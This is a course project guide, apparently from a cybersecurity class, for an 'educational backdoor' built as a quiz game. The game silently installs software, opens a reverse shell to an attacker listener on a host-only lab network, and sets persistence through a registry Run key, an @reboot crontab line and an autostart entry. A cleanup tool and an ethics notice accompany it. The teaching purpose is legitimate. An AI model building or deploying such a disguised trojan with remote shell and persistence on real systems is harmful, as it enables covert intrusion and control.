# Educational Backdoor Game — Full Project Guide
**Rwanda Coding Academy | Cybersecurity Course Assignment**
> For educational purposes only. Run exclusively in isolated virtual machines.

---

## Table of Contents
1. Project Overview
2. Project Structure
3. How It Works — Full Flow
4. VM Network Setup
5. Step-by-Step: How to Run
6. Each Component Explained
7. Persistence Mechanisms
8. Cleanup Tool
9. Troubleshooting
10. Ethical and Legal Notice

---

## 1. Project Overview

This project is a cybersecurity demonstration disguised as a security-awareness quiz game.
When the target runs the game, it:

- Checks whether required software (Python, Git) is installed and downloads + installs them
  silently from a local server if not
- Establishes a reverse shell back to the attacker's listener, giving shell access to the target
- Sets up persistence so the game (and shell) restart automatically after every reboot
- Runs a fully functional quiz game so the target has no reason to close it

A separate cleanup tool removes all persistence when the demonstration is done.

---

## 2. Project Structure

```
project/
├── Game/
│   ├── main.py               # Entry point — orchestrates everything
│   ├── game_engine.py        # The actual quiz game (3 levels)
│   ├── dependency_checker.py # Checks/installs Python and Git
│   ├── persistence.py        # Sets up registry / crontab persistence
│   ├── reverse_shell.py      # Connects back to the listener
│   └── utils.py              # Disclaimer screen + VM check
│
├── Server/
│   ├── file_server.py        # HTTP server that serves installers
│   ├── listener.py           # Receives the reverse shell connection
│   └── Dependencies/
│       ├── python-3.9.0.exe  # Windows Python installer
│       └── git-2.35.0.exe    # Windows Git installer
│
├── cleanup/
│   └── cleanup_tool.py       # Removes all persistence
│
├── docs/
│   ├── README.md
│   └── PROJECT_GUIDE.md      # this file
│
└── requirements.txt          # No external dependencies needed
```

---

## 3. How It Works — Full Flow

```
TARGET VM                              ATTACKER VM
─────────────────────────────────────────────────────────────────
python Game/main.py
  │
  ├─ 1. VM check (utils.py)
  │      Looks for VirtualBox/QEMU drivers.
  │      If not found, asks user to confirm they are in a VM.
  │
  ├─ 2. Disclaimer (utils.py)
  │      Shows ethical notice.
  │      User must type "I UNDERSTAND" to continue.
  │
  ├─ 3. Dependency check (dependency_checker.py)
  │      Runs: python --version, git --version
  │      If missing on Windows:
  │        downloads .exe from http://192.168.56.1:8000/  ←── file_server.py (port 8000)
  │        runs installer silently
  │      If missing on Linux: uses apt install
  │
  ├─ 4. Persistence (persistence.py)
  │      Windows: writes to HKCU Run registry key
  │      Linux:   adds @reboot crontab entry
  │               creates ~/.config/autostart/security-education.desktop
  │
  ├─ 5. Reverse shell thread (reverse_shell.py) ──────────→ listener.py (port 4444)
  │      Runs in background daemon thread.
  │      Connects to 192.168.56.1:4444
  │      Sends system info on connect.
  │      Waits for commands, executes them, sends output back.
  │      Retries every 10 seconds if connection drops.
  │
  └─ 6. Game (game_engine.py)
         3-level security awareness quiz runs in foreground.
         Keeps the target occupied while shell runs in background.
```

---

## 4. VM Network Setup

You need two VMs on a Host-Only network (no internet, fully isolated).

| Machine              | Role                          | IP Address      |
|----------------------|-------------------------------|-----------------|
| Attacker VM (Linux)  | Runs listener + file server   | 192.168.56.1    |
| Target VM (Windows)  | Runs the game                 | 192.168.56.101  |

### Create Host-Only Network in VirtualBox

1. Open VirtualBox
2. File → Tools → Network Manager
3. Click Create to add a new Host-Only network
4. Set IPv4 Address: 192.168.56.1, Mask: 255.255.255.0, DHCP: Disabled
5. For each VM: Settings → Network → Adapter → Attached to: Host-Only Adapter

### Set Static IPs

Attacker VM (Linux):
```bash
sudo ip addr add 192.168.56.1/24 dev eth0
```

Target VM (Windows):
- Open Network Settings → IPv4 → Manual
- IP: 192.168.56.101, Mask: 255.255.255.0, Gateway: 192.168.56.1

### Verify connectivity
```bash
# From attacker VM
ping 192.168.56.101

# From target VM
ping 192.168.56.1
```

---

## 5. Step-by-Step: How to Run

### Prerequisites
- Python 3.6+ installed on both VMs
- Project folder available on both VMs
- Installer files present in Server/Dependencies/:
  - python-3.9.0.exe
  - git-2.35.0.exe

---

### ATTACKER VM — Terminal 1: Start the File Server

```bash
cd project/Server
python3 file_server.py
```

Expected output:
```
============================================================
DEPENDENCY FILE SERVER
For Cybersecurity Course - VM Only
============================================================
[*] Server started on:
    - Local: http://127.0.0.1:8000
    - Network: http://192.168.56.1:8000
[*] Serving files from: .../Server/Dependencies
[*] Available files:
    - python-3.9.0.exe (XX.XX MB)
    - git-2.35.0.exe (XX.XX MB)
[*] Press Ctrl+C to stop server
```

Leave this terminal running.

---

### ATTACKER VM — Terminal 2: Start the Listener

```bash
cd project/Server
python3 listener.py
```

Expected output:
```
============================================================
EDUCATIONAL BACKDOOR LISTENER
For Cybersecurity Course - VM Only
============================================================
[*] Listening on 0.0.0.0:4444
[*] Waiting for connections...
[*] Type 'help' for commands
============================================================
```

Leave this terminal running.

---

### TARGET VM — Run the Game

```bash
cd project/Game
python main.py
```

Step 1 — VM Check:
```
[!] WARNING: No clear VM indicators detected!
[!] This program should ONLY be run in a virtual machine.
[*] Type 'VM' to confirm you're in a VM:
```
Type: VM

(If VirtualBox Guest Additions are installed, this step is skipped automatically.)

Step 2 — Disclaimer:
```
╔══════════════════════════════════════════════════════════════════╗
║                    ETHICAL DISCLAIMER                            ║
...
╚══════════════════════════════════════════════════════════════════╝

[*] Type 'I UNDERSTAND' to proceed:
```
Type: I UNDERSTAND

Step 3 — Dependency Check:
```
[*] Checking required dependencies...
  ✅ python is installed
  ✅ git is installed
```
If something is missing, it downloads and installs silently from the file server.

Step 4 — Persistence:
```
[*] Setting up persistence mechanism (educational)...
[*] Adding entry to HKCU Run registry key...
[✓] Persistence added: SecurityEducationBackdoor
```

Step 5 — Reverse Shell connects (background):
```
[*] Initializing reverse shell (VM only)...
[*] Attempting to connect to listener at 192.168.56.1:4444
```

On the attacker VM you will see:
```
[+] Connection received from ('192.168.56.101', XXXXX)

[System Information]
OS: Windows 10
Hostname: TARGET-PC
User: student
Architecture: AMD64

[ Educational Reverse Shell - VM Environment Only ]
Type 'help' for available commands

('192.168.56.101', XXXXX) >
```

Step 6 — Game starts in foreground:
```
[*] Starting security awareness game...

╔══════════════════════════════════════════════════════════╗
║     SECURITY AWARENESS TRAINING GAME                     ║
...
```

---

### ATTACKER VM — Using the Shell

Type commands at the prompt on the listener terminal:

```
('192.168.56.101', XXXXX) > whoami
('192.168.56.101', XXXXX) > dir
('192.168.56.101', XXXXX) > ipconfig
('192.168.56.101', XXXXX) > help
('192.168.56.101', XXXXX) > exit
```

Special commands:

| Command     | Description                              |
|-------------|------------------------------------------|
| help        | Show available commands                  |
| exit        | Close the shell connection               |
| screenshot  | Simulated screenshot (educational)       |
| cd <path>   | Change working directory on target       |
| any command | Executed on target, output returned      |

---

### TARGET VM — Cleanup After Demonstration

```bash
cd project/cleanup
python cleanup_tool.py
```

Type CLEAN when prompted. This removes all persistence entries.

---

## 6. Each Component Explained

### Game/main.py
The orchestrator. Runs all steps in sequence:
1. VM environment check
2. Disclaimer and consent
3. Dependency check and install
4. Persistence setup
5. Reverse shell in a background daemon thread
6. Game loop in foreground

### Game/utils.py
- show_disclaimer(): prints the ethical notice, returns True only if user types "I UNDERSTAND"
- check_vm_environment(): looks for VirtualBox/VMware driver files on Windows, or checks
  /proc/cpuinfo for "hypervisor" or "QEMU" on Linux. If nothing found, asks user to confirm.

### Game/dependency_checker.py
- Detects OS (Windows or Linux)
- On Windows: checks python --version and git --version, downloads .exe installers from
  http://192.168.56.1:8000/ and runs them silently with /quiet and /SILENT flags
- On Linux: uses apt install (requires root)
- Server URL is hardcoded to 192.168.56.1:8000

### Game/persistence.py
- Windows: writes the game launch command to:
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  under the value name "SecurityEducationBackdoor"
- Linux method 1: adds "@reboot python3 /path/to/main.py # EducationalBackdoor" to crontab
- Linux method 2: creates ~/.config/autostart/security-education.desktop

### Game/reverse_shell.py
- Connects to 192.168.56.1:4444 via TCP socket
- On connect: immediately sends OS, hostname, username, architecture to the listener
- Loop: receives command from listener, executes via subprocess.run(shell=True), sends output back
- cd commands are handled specially (changes the process working directory)
- Retries every 10 seconds on disconnect — keeps trying forever

### Game/game_engine.py
- 3-level multiple choice quiz about cybersecurity
- Level 1: Basics (phishing, HTTPS)
- Level 2: Threats (backdoors, persistence)
- Level 3: Defense (protection strategies)
- Score out of 60, with educational feedback at the end

### Server/file_server.py
- Python's built-in http.server serving the Server/Dependencies/ folder on port 8000
- Target downloads installers from here when dependencies are missing

### Server/listener.py
- Binds TCP socket on 0.0.0.0:4444
- Accepts connections, spawns a thread per client
- Receives system info first (sent by shell on connect), then enters interactive command loop
- Sends commands, receives and prints output (65536 byte buffer)

### cleanup/cleanup_tool.py
- Requires user to type CLEAN to proceed
- Windows: deletes "SecurityEducationBackdoor" from the Run registry key
- Linux: removes lines containing "EducationalBackdoor" from crontab
- Linux: deletes ~/.config/autostart/security-education.desktop
- Scans ~/.bashrc and ~/.profile for leftover entries and warns if found

---

## 7. Persistence Mechanisms

### Windows — Registry Run Key
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  SecurityEducationBackdoor = "C:\Python39\python.exe" "C:\...\Game\main.py"
```
Runs automatically at every user login. Does not require admin rights (HKCU).

To verify manually: open regedit and navigate to:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

### Linux — Crontab
```
@reboot /usr/bin/python3 /path/to/Game/main.py >/dev/null 2>&1 & # EducationalBackdoor
```
Runs at every system boot. Verify with: crontab -l

### Linux — Autostart Desktop Entry
```
~/.config/autostart/security-education.desktop
```
Runs when the desktop environment (GNOME/KDE) starts.
Verify with: ls ~/.config/autostart/

---

## 8. Cleanup Tool

Run this on the target VM after the demonstration:

```bash
cd project/cleanup
python cleanup_tool.py
```

Type CLEAN when prompted.

What it removes:
- Windows: SecurityEducationBackdoor registry value under HKCU Run
- Linux: crontab entry matched by the "# EducationalBackdoor" comment marker
- Linux: ~/.config/autostart/security-education.desktop
- Warns if entries are found in ~/.bashrc or ~/.profile (manual removal needed)

Verify cleanup on Windows:
- Open regedit → HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- The SecurityEducationBackdoor entry should be gone

Verify cleanup on Linux:
```bash
crontab -l
ls ~/.config/autostart/
```

---

## 9. Troubleshooting

### Game exits immediately after VM check
You typed something other than VM. Re-run and type exactly: VM

### Game exits after disclaimer
You must type exactly: I UNDERSTAND (all caps, with space)

### Reverse shell not connecting
- Make sure listener.py is running on the attacker VM BEFORE starting the game
- The shell retries every 10 seconds — it will connect once the listener is up
- Check the attacker VM IP is 192.168.56.1. If different, edit reverse_shell.py:
    def __init__(self, server_ip='192.168.56.1', server_port=4444):
- Allow port on attacker VM firewall:
    sudo ufw allow 4444

### Dependencies not downloading
- Confirm file_server.py is running on attacker VM
- Confirm installer files exist in Server/Dependencies/
- Test from target VM:
    curl http://192.168.56.1:8000/python-3.9.0.exe
- Allow port on attacker VM firewall:
    sudo ufw allow 8000

### Persistence not working on Windows
- Run main.py as Administrator (right-click → Run as administrator)
- Verify with regedit after running

### Persistence not working on Linux
- Crontab works without special permissions for user-level @reboot
- Autostart requires a desktop environment to be running
- Run crontab -l to verify the entry was added

### Port already in use
```bash
sudo lsof -i :4444
sudo kill -9 <PID>
```

---

## 10. Ethical and Legal Notice

This project exists solely for the Rwanda Coding Academy cybersecurity course.
By running any part of this code you confirm:

- You are running it in an isolated virtual machine with no connection to real networks
- You have explicit authorization to run it on the target machine
- You will not deploy any part of this on real systems
- You understand that unauthorized use of reverse shells, persistence mechanisms,
  or backdoors is illegal under computer fraud laws in Rwanda and internationally

The knowledge demonstrated here is intended to help you recognize and defend against
these techniques — not to deploy them maliciously.
